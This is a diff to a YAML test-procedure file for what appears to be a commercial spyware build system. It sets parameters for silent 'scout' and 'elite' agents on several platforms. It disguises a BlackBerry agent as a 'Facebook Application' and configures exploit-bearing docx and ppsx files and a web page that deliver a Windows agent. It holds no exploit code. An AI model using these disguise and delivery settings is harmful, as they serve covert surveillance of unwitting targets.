@@ -1,3 +1,81 @@
+SET_BUILD_PARAMS:
+    SET:
+        android:
+          binary: {admin: false, demo: true}
+          melt: {}
+          platform: android
+          sign: {}
+        blackberry:
+          binary: {demo: true}
+          melt: {appname: facebook, desc: Applicazione utilissima di social network, name: Facebook
+              Application, vendor: face inc, version: 1.2.3}
+          package: {type: local}
+          platform: blackberry
+        exploit:
+          deliver: {user: USERID}
+          factory: {_id: '000'}
+          generate:
+            binary: {admin: false, demo: false}
+            exploit: HT-2012-001
+            melt: {admin: false, demo: false, scout: true}
+            platforms: [windows]
+          melt: {appname: agent.exe, combo: txt, filename: example.txt, input: '000'}
+          platform: exploit
+        exploit_docx:
+          deliver: {user: USERID}
+          factory: {_id: '000'}
+          generate:
+            binary: {admin: false, demo: false}
+            exploit: HT-2013-002
+            melt: {admin: false, demo: false, scout: true}
+            platforms: [windows]
+          melt: {appname: APPNAME, filename: example.docx, input: '000', url: 'http://HOSTNAME/APPNAME'}
+          platform: exploit
+        exploit_ppsx:
+          deliver: {user: USERID}
+          factory: {_id: '000'}
+          generate:
+            binary: {admin: false, demo: false}
+            exploit: HT-2013-003
+            melt: {admin: false, demo: false, scout: true}
+            platforms: [windows]
+          melt: {appname: APPNAME, filename: example.ppsx, input: '000', url: 'http://HOSTNAME/APPNAME'}
+          platform: exploit
+        exploit_web:
+          deliver: {user: USERID}
+          factory: {_id: '000'}
+          generate:
+            binary: {admin: false, demo: false}
+            exploit: HT-2013-002
+            melt: {admin: false, demo: false, scout: true}
+            platforms: [windows]
+          melt: {appname: APPNAME, filename: example.docx, input: '000', url: 'http://HOSTNAME/APPNAME'}
+          platform: exploit
+        ios:
+          binary: {demo: true}
+          melt: {}
+          platform: ios
+        linux:
+          binary: {admin: false, demo: true}
+          melt: {}
+          platform: linux
+        osx:
+          binary: {admin: true, demo: true}
+          melt: {}
+          platform: osx
+        windows:
+          binary: {admin: false, demo: true}
+          melt: {admin: false, bit64: true, codec: true, scout: true}
+          platform: windows
+          sign: {}
+
+SET_DEFAULTS:
+    - CALL: SET_BUILD_PARAMS
+    - SET:
+        backend: 192.168.100.201
+        frontend: 172.20.100.204
+        redis: 10.0.20.1
+
 TEST:
     - BEGIN
     - START_AGENT
@@ -20,29 +98,21 @@ DISPATCH:
 SCOUT:
     - CALL: DISPATCH
     - START_AGENT
-    - SET:
-        - [backend, 192.168.100.201]
-        - [frontend, 172.20.100.204]
-        - [redis, 10.0.20.1]
+    - CALL: SET_DEFAULTS
     - BUILD: [ scout, windows, silent ]
     - STOP_AGENT
 
 MANUAL_BUILD:
     - START_AGENT
-    - SET:
-        - [backend, 192.168.100.201]
-        - [frontend, 172.20.100.204]
-        - [redis, 10.0.20.1]
+    - CALL: SET_DEFAULTS
     - BUILD: [ pull, windows, silent ]
     - STOP_AGENT
 
 ELITE:
     - CALL: DISPATCH
     - START_AGENT
-    - SET:
-        - [backend, 192.168.100.201]
-        - [frontend, 172.20.100.204]
-        - [redis, 10.0.20.1]
+    - CALL: SET_DEFAULTS
+
     - BUILD: [ elite, windows, silent ]
     - STOP_AGENT
 
